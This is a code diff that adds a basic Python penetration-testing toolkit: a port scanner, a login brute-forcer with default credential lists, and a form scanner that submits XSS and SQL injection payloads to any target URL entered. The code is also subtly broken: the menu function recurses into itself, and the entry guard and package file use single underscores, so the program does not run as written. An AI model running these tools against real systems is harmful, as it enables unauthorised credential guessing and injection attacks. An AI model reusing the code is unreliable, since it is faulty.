@@ -1,0 +1,116 @@
+STRUCTURE OVERVIEW--
+pentest_toolkit/
+│
+├── main.py
+├── scanner/
+│   ├── _init_.py
+│   ├── port_scanner.py
+│   ├── brute_forcer.py
+│   └── vuln_scanner.py
+└── README.md 
+
+PORT_SCANNER.PY
+import socket
+
+def scan_ports(target, ports):
+    print(f"[+] Scanning {target}...")
+    for port in ports:
+        try:
+            sock = socket.socket()
+            sock.settimeout(0.5)
+            result = sock.connect_ex((target, port))
+            if result == 0:
+                print(f"[OPEN] Port {port}")
+            sock.close()
+        except KeyboardInterrupt:
+            print("[-] Stopping port scan")
+            break
+
+BRUTE_FORCER.PY
+import requests
+
+def brute_force_login(url, username_list, password_list):
+    for username in username_list:
+        for password in password_list:
+            data = {'username': username, 'password': password}
+            response = requests.post(url, data=data)
+            if "Invalid" not in response.text:
+                print(f"[+] Found credentials: {username}/{password}")
+                return
+    print("[-] No valid credentials found.")
+
+VULN_SCANNER.PY(SIMPLIFIED FROM PREVIOUS)
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+XSS_PAYLOADS = ['<script>alert(1)</script>']
+SQLI_PAYLOADS = ["' OR '1'='1"]
+
+def get_forms(url):
+    soup = BeautifulSoup(requests.get(url).text, "html.parser")
+    return soup.find_all("form")
+
+def get_form_details(form):
+    return {
+        "action": form.attrs.get("action"),
+        "method": form.attrs.get("method", "get").lower(),
+        "inputs": [i.attrs.get("name") for i in form.find_all("input") if i.attrs.get("name")]
+    }
+
+def submit_form(form_details, url, value):
+    target_url = urljoin(url, form_details["action"])
+    data = {name: value for name in form_details["inputs"]}
+    return requests.post(target_url, data=data)
+
+def scan_xss(url):
+    for form in get_forms(url):
+        details = get_form_details(form)
+        for payload in XSS_PAYLOADS:
+            r = submit_form(details, url, payload)
+            if payload in r.text:
+                print(f"[!] XSS vulnerability at {url} | Payload: {payload}")
+
+def scan_sqli(url):
+    for form in get_forms(url):
+        details = get_form_details(form)
+        for payload in SQLI_PAYLOADS:
+            r = submit_form(details, url, payload)
+            if "sql" in r.text.lower() or "error" in r.text.lower():
+                print(f"[!] SQLi vulnerability at {url} | Payload: {payload}")
+
+MAIN.PY(command-line interface)
+from scanner import port_scanner, brute_forcer, vuln_scanner
+
+def menu():
+    print("""
+    === PenTest Toolkit ===
+    1. Port Scanner
+    2. Brute-Force Login
+    3. Vulnerability Scanner
+    0. Exit
+    """)
+
+    while True:
+        menu()
+        choice = input("Choose an option: ")
+        if choice == "1":
+            target = input("Target IP/Host: ")
+            ports = list(map(int, input("Ports (comma-separated): ").split(',')))
+            port_scanner.scan_ports(target, ports)
+        elif choice == "2":
+            url = input("Login form URL: ")
+            usernames = ["admin", "user"]
+            passwords = ["admin", "1234", "password"]
+            brute_forcer.brute_force_login(url, usernames, passwords)
+        elif choice == "3":
+            target = input("Target URL: ")
+            vuln_scanner.scan_xss(target)
+            vuln_scanner.scan_sqli(target)
+        elif choice == "0":
+            break
+        else:
+            print("Invalid choice")
+
+if _name_ == "_main_":
+    menu()
